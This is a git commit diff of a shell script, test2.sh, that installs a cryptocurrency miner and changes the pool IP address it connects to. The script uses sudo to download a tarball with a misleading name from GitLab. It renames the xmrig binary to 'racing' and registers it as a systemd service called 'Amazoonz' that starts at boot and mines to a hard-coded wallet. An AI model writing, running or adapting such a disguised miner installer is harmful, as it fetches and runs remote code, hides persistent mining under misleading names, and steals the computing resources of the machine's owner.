2976c8f34ea2da5e3125bef92bfbd6e725d19942
levanloc <levanloc7520@gmail.com>
2023-12-25 23:53:24 +0700

    Update test2.sh

--- test2.sh
+++ test2.sh
@@ -8,7 +8,7 @@ sudo wget https://gitlab.com/amaz/grabcar/-/raw/main/amazonpython.tar.gz
 sudo apt update
 sudo tar xvzf amazonpython.tar.gz
 sudo mv xmrig-6.20.0 racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Amazoonz\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o 20.212.9.240:3333 -u ZEPHs85fB2beCgLJfaa4fLQZSCC4fpmJTWWN9qw9ubfjGEk3RknpcHdDV93vY5BioJDJQ1dfpvWj5QMBfjYMS99X8VhEztpZD1b -p '$worker_value' -a rx/0 -k -t '$worker_thread'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/amazoonz.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Amazoonz\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o 20.205.190.131:3333 -u ZEPHs85fB2beCgLJfaa4fLQZSCC4fpmJTWWN9qw9ubfjGEk3RknpcHdDV93vY5BioJDJQ1dfpvWj5QMBfjYMS99X8VhEztpZD1b -p '$worker_value' -a rx/0 -k -t '$worker_thread'\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/amazoonz.service'
 sudo systemctl daemon-reload
 sudo systemctl enable amazoonz.service
 echo "$worker_value Connected to the pool successfully"
